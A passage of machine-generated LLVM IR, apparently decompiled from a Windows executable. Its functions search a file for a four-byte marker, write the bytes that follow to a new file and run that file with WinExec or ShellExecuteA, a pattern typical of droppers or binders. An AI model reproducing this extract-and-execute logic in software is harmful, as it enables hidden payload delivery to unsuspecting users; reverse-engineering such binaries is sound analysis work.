  store i32 ptrtoint (i8** @global_var_13143f24 to i32), i32* %114, align 4, !insn.addr !170
  %115 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !171
  %116 = icmp eq i32 %115, 0, !insn.addr !172
  %117 = add i32 %esp.3.reload, -12
  %118 = inttoptr i32 %117 to i32*
  store i32 5, i32* %118, align 4
  %119 = add i32 %esp.3.reload, -16
  %120 = inttoptr i32 %119 to i32*
  br i1 %116, label %dec_label_pc_131414a0, label %dec_label_pc_13141474, !insn.addr !173

dec_label_pc_13141474:                            ; preds = %dec_label_pc_1314145c
  store i32 0, i32* %120, align 4, !insn.addr !174
  %121 = add i32 %esp.3.reload, -20, !insn.addr !175
  %122 = inttoptr i32 %121 to i32*, !insn.addr !175
  store i32 0, i32* %122, align 4, !insn.addr !175
  %123 = add i32 %esp.3.reload, -24, !insn.addr !176
  %124 = inttoptr i32 %123 to i32*, !insn.addr !176
  store i32 ptrtoint (i8** @global_var_13143c1c to i32), i32* %124, align 4, !insn.addr !176
  %125 = add i32 %esp.3.reload, -28, !insn.addr !177
  %126 = inttoptr i32 %125 to i32*, !insn.addr !177
  store i32 ptrtoint ([5 x i8]* @global_var_13143000 to i32), i32* %126, align 4, !insn.addr !177
  %127 = add i32 %esp.3.reload, -32, !insn.addr !178
  %128 = inttoptr i32 %127 to i32*, !insn.addr !178
  store i32 0, i32* %128, align 4, !insn.addr !178
  %129 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !179
  %130 = load i32, i32* @global_var_1314309a, align 4, !insn.addr !180
  %131 = icmp eq i32 %130, 1, !insn.addr !180
  %132 = icmp eq i1 %131, false, !insn.addr !181
  br i1 %132, label %dec_label_pc_13141499, label %dec_label_pc_13141494, !insn.addr !181

dec_label_pc_13141494:                            ; preds = %dec_label_pc_13141474
  %133 = call i32 @function_13141000(), !insn.addr !182
  br label %dec_label_pc_13141499, !insn.addr !182

dec_label_pc_13141499:                            ; preds = %dec_label_pc_13141494, %dec_label_pc_13141474
  %134 = add i32 %esp.3.reload, -36, !insn.addr !183
  %135 = inttoptr i32 %134 to i32*, !insn.addr !183
  store i32 0, i32* %135, align 4, !insn.addr !183
  call void @ExitProcess(i32 ptrtoint (i32* @0 to i32)), !insn.addr !184
  unreachable, !insn.addr !184

dec_label_pc_131414a0:                            ; preds = %dec_label_pc_1314145c
  store i32 ptrtoint (i8** @global_var_13143c1c to i32), i32* %120, align 4, !insn.addr !185
  %136 = call i32 @WinExec(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !186
  %137 = load i32, i32* @global_var_1314309a, align 4, !insn.addr !187
  %138 = icmp eq i32 %137, 1, !insn.addr !187
  %139 = icmp eq i1 %138, false, !insn.addr !188
  br i1 %139, label %dec_label_pc_131414ba, label %dec_label_pc_131414b5, !insn.addr !188

dec_label_pc_131414b5:                            ; preds = %dec_label_pc_131414a0
  %140 = call i32 @function_13141000(), !insn.addr !189
  br label %dec_label_pc_131414ba, !insn.addr !189

dec_label_pc_131414ba:                            ; preds = %dec_label_pc_131414b5, %dec_label_pc_131414a0
  %141 = add i32 %esp.3.reload, -20, !insn.addr !190
  %142 = inttoptr i32 %141 to i32*, !insn.addr !190
  store i32 0, i32* %142, align 4, !insn.addr !190
  call void @ExitProcess(i32 ptrtoint (i32* @0 to i32)), !insn.addr !191
  ret i32 ptrtoint (i32* @0 to i32), !insn.addr !191
}

define i32 @function_131414c1() local_unnamed_addr {
dec_label_pc_131414c1:
  %esp.2.reg2mem = alloca i32, !insn.addr !192
  %merge.reg2mem = alloca i32, !insn.addr !192
  %esp.1.reg2mem = alloca i32, !insn.addr !192
  %eax.1.reg2mem = alloca i32, !insn.addr !192
  %.reg2mem10 = alloca i32, !insn.addr !192
  %esp.0.reg2mem = alloca i32, !insn.addr !192
  %eax.0.reg2mem = alloca i32, !insn.addr !192
  %.reg2mem = alloca i32, !insn.addr !192
  %stack_var_-56 = alloca i8*, align 4
  %stack_var_-28 = alloca i8*, align 4
  %0 = load i32, i32* @global_var_13143e1c, align 4, !insn.addr !192
  %1 = icmp eq i32 %0, 1, !insn.addr !192
  %2 = icmp eq i1 %1, false, !insn.addr !193
  store i32 %0, i32* %.reg2mem, !insn.addr !193
  br i1 %2, label %dec_label_pc_131414f5, label %dec_label_pc_131414ca, !insn.addr !193

dec_label_pc_131414ca:                            ; preds = %dec_label_pc_131414c1
  store i8* bitcast (i8** @global_var_13143b1c to i8*), i8** %stack_var_-28, align 4, !insn.addr !194
  %3 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !194
  %4 = call i32* @CreateFileA(i8* bitcast (i8** @global_var_13143b1c to i8*), i32 1073741824, i32 1, %_SECURITY_ATTRIBUTES* null, i32 2, i32 128, i32* null), !insn.addr !195
  %5 = ptrtoint i32* %4 to i32, !insn.addr !195
  store i32 %5, i32* @global_var_13143614, align 4, !insn.addr !196
  %6 = load i32, i32* @global_var_13143e20, align 4, !insn.addr !197
  store i32 %6, i32* @global_var_131434f8, align 4, !insn.addr !198
  %.pre = load i32, i32* @global_var_13143e1c, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !198
  store i32 %6, i32* %eax.0.reg2mem, !insn.addr !198
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !198
  br label %dec_label_pc_131414f5, !insn.addr !198

dec_label_pc_131414f5:                            ; preds = %dec_label_pc_131414ca, %dec_label_pc_131414c1
  %.reload = load i32, i32* %.reg2mem, !insn.addr !199
  %7 = icmp eq i32 %.reload, 2, !insn.addr !199
  %8 = icmp eq i1 %7, false, !insn.addr !200
  br i1 %8, label %dec_label_pc_131414f5.dec_label_pc_13141529_crit_edge, label %dec_label_pc_131414fe, !insn.addr !200

dec_label_pc_131414f5.dec_label_pc_13141529_crit_edge: ; preds = %dec_label_pc_131414f5
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %.pre7 = load i32, i32* @global_var_13143614, align 4
  store i32 %.pre7, i32* %.reg2mem10
  store i32 %eax.0.reload, i32* %eax.1.reg2mem
  store i32 %esp.0.reload, i32* %esp.1.reg2mem
  br label %dec_label_pc_13141529

dec_label_pc_131414fe:                            ; preds = %dec_label_pc_131414f5
  store i8* bitcast (i8** @global_var_13143c1c to i8*), i8** %stack_var_-56, align 4, !insn.addr !201
  %9 = ptrtoint i8** %stack_var_-56 to i32, !insn.addr !201
  %10 = call i32* @CreateFileA(i8* bitcast (i8** @global_var_13143c1c to i8*), i32 1073741824, i32 1, %_SECURITY_ATTRIBUTES* null, i32 1, i32 128, i32* null), !insn.addr !202
  %11 = ptrtoint i32* %10 to i32, !insn.addr !202
  store i32 %11, i32* @global_var_13143614, align 4, !insn.addr !203
  %12 = load i32, i32* @global_var_13143e70, align 4, !insn.addr !204
  store i32 %12, i32* @global_var_131434f8, align 4, !insn.addr !205
  store i32 %11, i32* %.reg2mem10, !insn.addr !205
  store i32 %12, i32* %eax.1.reg2mem, !insn.addr !205
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !205
  br label %dec_label_pc_13141529, !insn.addr !205

dec_label_pc_13141529:                            ; preds = %dec_label_pc_131414f5.dec_label_pc_13141529_crit_edge, %dec_label_pc_131414fe
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %.reload11 = load i32, i32* %.reg2mem10, !insn.addr !206
  %13 = icmp eq i32 %.reload11, -1, !insn.addr !206
  %14 = icmp eq i1 %13, false, !insn.addr !207
  store i32 %eax.1.reload, i32* %merge.reg2mem, !insn.addr !207
  br i1 %14, label %dec_label_pc_13141533, label %dec_label_pc_13141532, !insn.addr !207

dec_label_pc_13141532:                            ; preds = %dec_label_pc_13141533, %dec_label_pc_13141529
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !208

dec_label_pc_13141533:                            ; preds = %dec_label_pc_13141529
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %15 = add i32 %esp.1.reload, -4, !insn.addr !209
  %16 = inttoptr i32 %15 to i32*, !insn.addr !209
  store i32 2, i32* %16, align 4, !insn.addr !209
  %17 = add i32 %esp.1.reload, -8, !insn.addr !210
  %18 = inttoptr i32 %17 to i32*, !insn.addr !210
  store i32 0, i32* %18, align 4, !insn.addr !210
  %19 = add i32 %esp.1.reload, -12, !insn.addr !211
  %20 = inttoptr i32 %19 to i32*, !insn.addr !211
  store i32 0, i32* %20, align 4, !insn.addr !211
  %21 = load i32, i32* @global_var_13143614, align 4, !insn.addr !212
  %22 = add i32 %esp.1.reload, -16, !insn.addr !212
  %23 = inttoptr i32 %22 to i32*, !insn.addr !212
  store i32 %21, i32* %23, align 4, !insn.addr !212
  %24 = call i32 @SetFilePointer(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !213
  %25 = add i32 %esp.1.reload, -20, !insn.addr !214
  %26 = inttoptr i32 %25 to i32*, !insn.addr !214
  store i32 0, i32* %26, align 4, !insn.addr !214
  %27 = add i32 %esp.1.reload, -24, !insn.addr !215
  %28 = inttoptr i32 %27 to i32*, !insn.addr !215
  store i32 ptrtoint (i8** @global_var_13143a1c to i32), i32* %28, align 4, !insn.addr !215
  %29 = call i32 @_lopen(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !216
  %30 = icmp eq i32 %29, -1, !insn.addr !217
  store i32 -1, i32* %merge.reg2mem, !insn.addr !218
  br i1 %30, label %dec_label_pc_13141532, label %dec_label_pc_13141559, !insn.addr !218

dec_label_pc_13141559:                            ; preds = %dec_label_pc_13141533
  store i32 %29, i32* @global_var_1314307e, align 4, !insn.addr !219
  %31 = add i32 %esp.1.reload, -28, !insn.addr !220
  %32 = inttoptr i32 %31 to i32*, !insn.addr !220
  store i32 0, i32* %32, align 4, !insn.addr !220
  %33 = add i32 %esp.1.reload, -32, !insn.addr !221
  %34 = inttoptr i32 %33 to i32*, !insn.addr !221
  store i32 0, i32* %34, align 4, !insn.addr !221
  %35 = load i32, i32* @global_var_131434f8, align 4, !insn.addr !222
  %36 = add i32 %esp.1.reload, -36, !insn.addr !222
  %37 = inttoptr i32 %36 to i32*, !insn.addr !222
  store i32 %35, i32* %37, align 4, !insn.addr !222
  %38 = load i32, i32* @global_var_1314307e, align 4, !insn.addr !223
  %39 = add i32 %esp.1.reload, -40, !insn.addr !223
  %40 = inttoptr i32 %39 to i32*, !insn.addr !223
  store i32 %38, i32* %40, align 4, !insn.addr !223
  %41 = call i32 @SetFilePointer(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !224
  store i32 %39, i32* %esp.2.reg2mem, !insn.addr !224
  br label %dec_label_pc_13141573, !insn.addr !224

dec_label_pc_13141573:                            ; preds = %dec_label_pc_131415e1, %dec_label_pc_13141559
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %42 = add i32 %esp.2.reload, -4, !insn.addr !225
  %43 = inttoptr i32 %42 to i32*, !insn.addr !225
  store i32 1, i32* %43, align 4, !insn.addr !225
  %44 = add i32 %esp.2.reload, -8, !insn.addr !226
  %45 = inttoptr i32 %44 to i32*, !insn.addr !226
  store i32 0, i32* %45, align 4, !insn.addr !226
  %46 = load i32, i32* @global_var_1314307e, align 4, !insn.addr !227
  %47 = add i32 %esp.2.reload, -12, !insn.addr !227
  %48 = inttoptr i32 %47 to i32*, !insn.addr !227
  store i32 %46, i32* %48, align 4, !insn.addr !227
  %49 = call i32 @_llseek(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !228
  %50 = load i32, i32* @global_var_13143e1c, align 4, !insn.addr !229
  %51 = icmp eq i32 %50, 1, !insn.addr !229
  %52 = icmp eq i1 %51, false, !insn.addr !230
  br i1 %52, label %dec_label_pc_131415aa, label %dec_label_pc_1314158b, !insn.addr !230

dec_label_pc_1314158b:                            ; preds = %dec_label_pc_13141573
  %53 = load i32, i32* @global_var_13143ec0, align 4, !insn.addr !231
  %54 = icmp eq i32 %49, %53, !insn.addr !231
  %55 = icmp eq i1 %54, false, !insn.addr !232
  br i1 %55, label %dec_label_pc_131415aa, label %dec_label_pc_13141593, !insn.addr !232

dec_label_pc_13141593:                            ; preds = %dec_label_pc_1314158b
  %56 = load i32, i32* @global_var_13143614, align 4, !insn.addr !233
  %57 = add i32 %esp.2.reload, -16, !insn.addr !233
  %58 = inttoptr i32 %57 to i32*, !insn.addr !233
  store i32 %56, i32* %58, align 4, !insn.addr !233
  %59 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !234
  %60 = load i32, i32* @global_var_1314307e, align 4, !insn.addr !235
  %61 = add i32 %esp.2.reload, -20, !insn.addr !235
  %62 = inttoptr i32 %61 to i32*, !insn.addr !235
  store i32 %60, i32* %62, align 4, !insn.addr !235
  %63 = call i32 @_lclose(i32 ptrtoint (i32* @0 to i32)), !insn.addr !236
  ret i32 %63, !insn.addr !237

dec_label_pc_131415aa:                            ; preds = %dec_label_pc_1314158b, %dec_label_pc_13141573
  %64 = add i32 %esp.2.reload, -16, !insn.addr !238
  %65 = inttoptr i32 %64 to i32*, !insn.addr !238
  store i32 1, i32* %65, align 4, !insn.addr !238
  %66 = add i32 %esp.2.reload, -20, !insn.addr !239
  %67 = inttoptr i32 %66 to i32*, !insn.addr !239
  store i32 ptrtoint (i8* @global_var_1314307d to i32), i32* %67, align 4, !insn.addr !239
  %68 = load i32, i32* @global_var_1314307e, align 4, !insn.addr !240
  %69 = add i32 %esp.2.reload, -24, !insn.addr !240
  %70 = inttoptr i32 %69 to i32*, !insn.addr !240
  store i32 %68, i32* %70, align 4, !insn.addr !240
  %71 = call i32 @_lread(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !241
  store i32 %71, i32* @global_var_13143f10, align 4, !insn.addr !242
  %72 = icmp eq i32 %71, 0, !insn.addr !243
  %73 = icmp eq i1 %72, false, !insn.addr !244
  br i1 %73, label %dec_label_pc_131415e1, label %dec_label_pc_131415ca, !insn.addr !244

dec_label_pc_131415ca:                            ; preds = %dec_label_pc_131415aa
  %74 = load i32, i32* @global_var_13143614, align 4, !insn.addr !245
  %75 = add i32 %esp.2.reload, -28, !insn.addr !245
  %76 = inttoptr i32 %75 to i32*, !insn.addr !245
  store i32 %74, i32* %76, align 4, !insn.addr !245
  %77 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !246
  %78 = load i32, i32* @global_var_1314307e, align 4, !insn.addr !247
  %79 = add i32 %esp.2.reload, -32, !insn.addr !247
  %80 = inttoptr i32 %79 to i32*, !insn.addr !247
  store i32 %78, i32* %80, align 4, !insn.addr !247
  %81 = call i32 @_lclose(i32 ptrtoint (i32* @0 to i32)), !insn.addr !248
  ret i32 %81, !insn.addr !249

dec_label_pc_131415e1:                            ; preds = %dec_label_pc_131415aa
  %82 = call i32 @function_13141711(), !insn.addr !250
  %83 = add i32 %esp.2.reload, -28, !insn.addr !251
  %84 = inttoptr i32 %83 to i32*, !insn.addr !251
  store i32 0, i32* %84, align 4, !insn.addr !251
  %85 = add i32 %esp.2.reload, -32, !insn.addr !252
  %86 = inttoptr i32 %85 to i32*, !insn.addr !252
  store i32 ptrtoint (i32* @global_var_13143618 to i32), i32* %86, align 4, !insn.addr !252
  %87 = add i32 %esp.2.reload, -36, !insn.addr !253
  %88 = inttoptr i32 %87 to i32*, !insn.addr !253
  store i32 1, i32* %88, align 4, !insn.addr !253
  %89 = add i32 %esp.2.reload, -40, !insn.addr !254
  %90 = inttoptr i32 %89 to i32*, !insn.addr !254
  store i32 ptrtoint (i8* @global_var_1314307d to i32), i32* %90, align 4, !insn.addr !254
  %91 = load i32, i32* @global_var_13143614, align 4, !insn.addr !255
  %92 = add i32 %esp.2.reload, -44, !insn.addr !255
  %93 = inttoptr i32 %92 to i32*, !insn.addr !255
  store i32 %91, i32* %93, align 4, !insn.addr !255
  %94 = call i1 @WriteFile(i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !256
  store i32 %92, i32* %esp.2.reg2mem, !insn.addr !257
  br label %dec_label_pc_13141573, !insn.addr !257
}

define i32 @function_13141605() local_unnamed_addr {
dec_label_pc_13141605:
  %esp.1.reg2mem = alloca i32, !insn.addr !258
  %esp.06.reg2mem = alloca i32, !insn.addr !258
  %.lcssa.reg2mem = alloca i32, !insn.addr !258
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @_lopen(i8* bitcast (i8** @global_var_13143a1c to i8*), i32 0), !insn.addr !259
  %1 = load i32, i32* @global_var_131435e8, align 4, !insn.addr !260
  %2 = icmp eq i32 %1, -1, !insn.addr !260
  br i1 %2, label %dec_label_pc_13141703, label %dec_label_pc_1314161e, !insn.addr !261

dec_label_pc_1314161e:                            ; preds = %dec_label_pc_13141605
  store i32 %0, i32* @global_var_131435e8, align 4, !insn.addr !262
  store i16 1, i16* bitcast (i32* @global_var_1314300b to i16*), align 4, !insn.addr !263
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !264
  %3 = inttoptr i32 %0 to i32*, !insn.addr !265
  %4 = call i32 @GetFileSize(i32* %3, i32* null), !insn.addr !265
  store i32 %4, i32* @global_var_131435ec, align 4, !insn.addr !266
  %5 = load i32, i32* @global_var_131434f8, align 4, !insn.addr !267
  %6 = add i32 %5, 1, !insn.addr !267
  store i32 %6, i32* @global_var_131434f8, align 4, !insn.addr !267
  %7 = icmp ult i32 %6, %4, !insn.addr !268
  %8 = icmp eq i32 %6, 0, !insn.addr !269
  %9 = icmp eq i1 %8, false, !insn.addr !270
  %or.cond5 = icmp eq i1 %7, %9
  store i32 %6, i32* %.lcssa.reg2mem, !insn.addr !271
  br i1 %or.cond5, label %dec_label_pc_13141657.lr.ph, label %dec_label_pc_13141651, !insn.addr !271

dec_label_pc_13141657.lr.ph:                      ; preds = %dec_label_pc_1314161e
  %10 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !264
  store i32 %10, i32* %esp.06.reg2mem
  br label %dec_label_pc_13141657

dec_label_pc_13141651:                            ; preds = %dec_label_pc_131416fe, %dec_label_pc_1314161e
  %.lcssa.reload = load i32, i32* %.lcssa.reg2mem
  ret i32 %.lcssa.reload, !insn.addr !272

dec_label_pc_13141657:                            ; preds = %dec_label_pc_13141657.lr.ph, %dec_label_pc_131416fe
  %esp.06.reload = load i32, i32* %esp.06.reg2mem
  %11 = add i32 %esp.06.reload, -4, !insn.addr !273
  %12 = inttoptr i32 %11 to i32*, !insn.addr !273
  store i32 0, i32* %12, align 4, !insn.addr !273
  %13 = add i32 %esp.06.reload, -8, !insn.addr !274
  %14 = inttoptr i32 %13 to i32*, !insn.addr !274
  store i32 0, i32* %14, align 4, !insn.addr !274
  %15 = load i32, i32* @global_var_131434f8, align 4, !insn.addr !275
  %16 = add i32 %esp.06.reload, -12, !insn.addr !275
  %17 = inttoptr i32 %16 to i32*, !insn.addr !275
  store i32 %15, i32* %17, align 4, !insn.addr !275
  %18 = load i32, i32* @global_var_131435e8, align 4, !insn.addr !276
  %19 = add i32 %esp.06.reload, -16, !insn.addr !276
  %20 = inttoptr i32 %19 to i32*, !insn.addr !276
  store i32 %18, i32* %20, align 4, !insn.addr !276
  %21 = call i32 @SetFilePointer(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !277
  %22 = add i32 %esp.06.reload, -20, !insn.addr !278
  %23 = inttoptr i32 %22 to i32*, !insn.addr !278
  store i32 0, i32* %23, align 4, !insn.addr !278
  %24 = add i32 %esp.06.reload, -24, !insn.addr !279
  %25 = inttoptr i32 %24 to i32*, !insn.addr !279
  store i32 ptrtoint (i32* @global_var_1314301f to i32), i32* %25, align 4, !insn.addr !279
  %26 = add i32 %esp.06.reload, -28, !insn.addr !280
  %27 = inttoptr i32 %26 to i32*, !insn.addr !280
  store i32 4, i32* %27, align 4, !insn.addr !280
  %28 = add i32 %esp.06.reload, -32, !insn.addr !281
  %29 = inttoptr i32 %28 to i32*, !insn.addr !281
  store i32 ptrtoint (i32* @global_var_13143548 to i32), i32* %29, align 4, !insn.addr !281
  %30 = load i32, i32* @global_var_131435e8, align 4, !insn.addr !282
  %31 = add i32 %esp.06.reload, -36, !insn.addr !282
  %32 = inttoptr i32 %31 to i32*, !insn.addr !282
  store i32 %30, i32* %32, align 4, !insn.addr !282
  %33 = call i1 @ReadFile(i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !283
  %34 = load i32, i32* @global_var_13143548, align 4, !insn.addr !284
  %35 = icmp eq i32 %34, 1768843622, !insn.addr !284
  %36 = icmp eq i1 %35, false, !insn.addr !285
  store i32 %31, i32* %esp.1.reg2mem, !insn.addr !285
  br i1 %36, label %dec_label_pc_131416fe, label %dec_label_pc_13141691, !insn.addr !285

dec_label_pc_13141691:                            ; preds = %dec_label_pc_13141657
  %37 = load i32, i32* @global_var_131434f8, align 4, !insn.addr !286
  %38 = add i32 %37, 4, !insn.addr !287
  store i32 %38, i32* @global_var_131434f8, align 4, !insn.addr !287
  %39 = add i32 %esp.06.reload, -40, !insn.addr !288
  %40 = inttoptr i32 %39 to i32*, !insn.addr !288
  store i32 0, i32* %40, align 4, !insn.addr !288
  %41 = add i32 %esp.06.reload, -44, !insn.addr !289
  %42 = inttoptr i32 %41 to i32*, !insn.addr !289
  store i32 ptrtoint (i32* @global_var_1314301f to i32), i32* %42, align 4, !insn.addr !289
  %43 = add i32 %esp.06.reload, -48, !insn.addr !290
  %44 = inttoptr i32 %43 to i32*, !insn.addr !290
  store i32 4, i32* %44, align 4, !insn.addr !290
  %45 = add i32 %esp.06.reload, -52, !insn.addr !291
  %46 = inttoptr i32 %45 to i32*, !insn.addr !291
  store i32 ptrtoint (i32* @global_var_13143548 to i32), i32* %46, align 4, !insn.addr !291
  %47 = load i32, i32* @global_var_131435e8, align 4, !insn.addr !292
  %48 = add i32 %esp.06.reload, -56, !insn.addr !292
  %49 = inttoptr i32 %48 to i32*, !insn.addr !292
  store i32 %47, i32* %49, align 4, !insn.addr !292
  %50 = call i1 @ReadFile(i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !293
  %51 = load i32, i32* @global_var_13143548, align 4, !insn.addr !294
  %52 = icmp eq i32 %51, 1768843622, !insn.addr !294
  %53 = icmp eq i1 %52, false, !insn.addr !295
  store i32 %48, i32* %esp.1.reg2mem, !insn.addr !295
  br i1 %53, label %dec_label_pc_131416fe, label %dec_label_pc_131416ce, !insn.addr !295

dec_label_pc_131416ce:                            ; preds = %dec_label_pc_13141691
  %54 = add i32 %esp.06.reload, -60, !insn.addr !296
  %55 = inttoptr i32 %54 to i32*, !insn.addr !296
  store i32 120, i32* %55, align 4, !insn.addr !296
  %56 = add i32 %esp.06.reload, -64, !insn.addr !297
  %57 = inttoptr i32 %56 to i32*, !insn.addr !297
  store i32 ptrtoint (i32* @global_var_13143548 to i32), i32* %57, align 4, !insn.addr !297
  call void @RtlZeroMemory(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !298
  %58 = load i32, i32* @global_var_131434f8, align 4, !insn.addr !299
  %59 = add i32 %58, 4, !insn.addr !300
  store i32 %59, i32* @global_var_131434f8, align 4, !insn.addr !300
  %60 = load i32, i32* @global_var_131435e8, align 4, !insn.addr !301
  %61 = add i32 %esp.06.reload, -68, !insn.addr !301
  %62 = inttoptr i32 %61 to i32*, !insn.addr !301
  store i32 %60, i32* %62, align 4, !insn.addr !301
  %63 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !302
  %64 = sext i1 %63 to i32, !insn.addr !302
  ret i32 %64, !insn.addr !303

dec_label_pc_131416fe:                            ; preds = %dec_label_pc_13141691, %dec_label_pc_13141657
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %65 = load i32, i32* @global_var_131434f8, align 4, !insn.addr !267
  %66 = add i32 %65, 1, !insn.addr !267
  store i32 %66, i32* @global_var_131434f8, align 4, !insn.addr !267
  %67 = load i32, i32* @global_var_131435ec, align 4, !insn.addr !268
  %68 = icmp ult i32 %66, %67, !insn.addr !268
  %69 = icmp eq i32 %66, 0, !insn.addr !269
  %70 = icmp eq i1 %69, false, !insn.addr !270
  %or.cond = icmp eq i1 %68, %70
  store i32 %66, i32* %.lcssa.reg2mem, !insn.addr !271
  store i32 %esp.1.reload, i32* %esp.06.reg2mem, !insn.addr !271
  br i1 %or.cond, label %dec_label_pc_13141657, label %dec_label_pc_13141651, !insn.addr !271

dec_label_pc_13141703:                            ; preds = %dec_label_pc_13141605
  call void @ExitProcess(i32 0), !insn.addr !304
  unreachable, !insn.addr !304
}

define i32 @function_1314170a() local_unnamed_addr {
dec_label_pc_1314170a:
  call void @ExitProcess(i32 0), !insn.addr !305
  ret i32 ptrtoint (i32* @0 to i32), !insn.addr !305
}

define i32 @function_13141711() local_unnamed_addr {
dec_label_pc_13141711:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i8, i8* @global_var_1314307d, align 1, !insn.addr !306
  %2 = add i8 %1, -1, !insn.addr !306
  store i8 %2, i8* @global_var_1314307d, align 1, !insn.addr !306
  ret i32 %0, !insn.addr !307
}

define i32 @function_13141718() local_unnamed_addr {
dec_label_pc_13141718:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i8, i8* @global_var_131430f8, align 1, !insn.addr !308
  %2 = add i8 %1, -1, !insn.addr !308
  store i8 %2, i8* @global_var_131430f8, align 1, !insn.addr !308
  ret i32 %0, !insn.addr !309
}

define i32 @function_1314171f() local_unnamed_addr {
dec_label_pc_1314171f:
  %edi.0.reg2mem = alloca i32, !insn.addr !310
  %esi.1.reg2mem = alloca i32, !insn.addr !310
  %ebx.02.reg2mem = alloca i32, !insn.addr !310
  %.reg2mem = alloca i8, !insn.addr !310
  %..pn.reg2mem = alloca i32, !insn.addr !310
  %ebx.0.lcssa.reg2mem = alloca i32, !insn.addr !310
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i1 @__decompiler_undefined_function_4()
  %2 = load i32, i32* @global_var_13143e1c, align 4, !insn.addr !311
  %3 = icmp eq i32 %2, 1, !insn.addr !311
  %4 = icmp eq i1 %3, false, !insn.addr !312
  %. = select i1 %4, i32 ptrtoint (i8** @global_var_13143c1c to i32), i32 ptrtoint (i8** @global_var_13143b1c to i32)
  %5 = inttoptr i32 %. to i8*, !insn.addr !313
  %6 = load i8, i8* %5, align 4, !insn.addr !313
  %7 = select i1 %1, i32 -1, i32 1, !insn.addr !313
  %8 = icmp eq i8 %6, 0, !insn.addr !314
  store i32 %., i32* %ebx.0.lcssa.reg2mem, !insn.addr !315
  store i32 %., i32* %..pn.reg2mem, !insn.addr !315
  store i8 %6, i8* %.reg2mem, !insn.addr !315
  store i32 %., i32* %ebx.02.reg2mem, !insn.addr !315
  br i1 %8, label %dec_label_pc_1314174e.preheader, label %dec_label_pc_1314173f, !insn.addr !315

dec_label_pc_1314174e.preheader:                  ; preds = %dec_label_pc_1314173f, %dec_label_pc_1314171f
  %ebx.0.lcssa.reload = load i32, i32* %ebx.0.lcssa.reg2mem
  store i32 %ebx.0.lcssa.reload, i32* %esi.1.reg2mem
  store i32 ptrtoint (i8** @global_var_13143f24 to i32), i32* %edi.0.reg2mem
  br label %dec_label_pc_1314174e

dec_label_pc_1314173f:                            ; preds = %dec_label_pc_1314171f, %dec_label_pc_1314173f
  %ebx.02.reload = load i32, i32* %ebx.02.reg2mem
  %.reload = load i8, i8* %.reg2mem
  %..pn.reload = load i32, i32* %..pn.reg2mem
  %9 = add i32 %..pn.reload, %7
  %10 = icmp eq i8 %.reload, 46, !insn.addr !316
  %11 = icmp eq i1 %10, false, !insn.addr !317
  %spec.select = select i1 %11, i32 %ebx.02.reload, i32 %9
  %12 = inttoptr i32 %9 to i8*, !insn.addr !313
  %13 = load i8, i8* %12, align 1, !insn.addr !313
  %14 = icmp eq i8 %13, 0, !insn.addr !314
  store i32 %spec.select, i32* %ebx.0.lcssa.reg2mem, !insn.addr !315
  store i32 %9, i32* %..pn.reg2mem, !insn.addr !315
  store i8 %13, i8* %.reg2mem, !insn.addr !315
  store i32 %spec.select, i32* %ebx.02.reg2mem, !insn.addr !315
  br i1 %14, label %dec_label_pc_1314174e.preheader, label %dec_label_pc_1314173f, !insn.addr !315

dec_label_pc_1314174e:                            ; preds = %dec_label_pc_1314174e.preheader, %dec_label_pc_1314174e
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %15 = inttoptr i32 %esi.1.reload to i8*, !insn.addr !318
  %16 = load i8, i8* %15, align 1, !insn.addr !318
  %17 = add i32 %esi.1.reload, %7, !insn.addr !318
  %18 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !319
  store i8 %16, i8* %18, align 1, !insn.addr !319
  %19 = add i32 %edi.0.reload, %7, !insn.addr !319
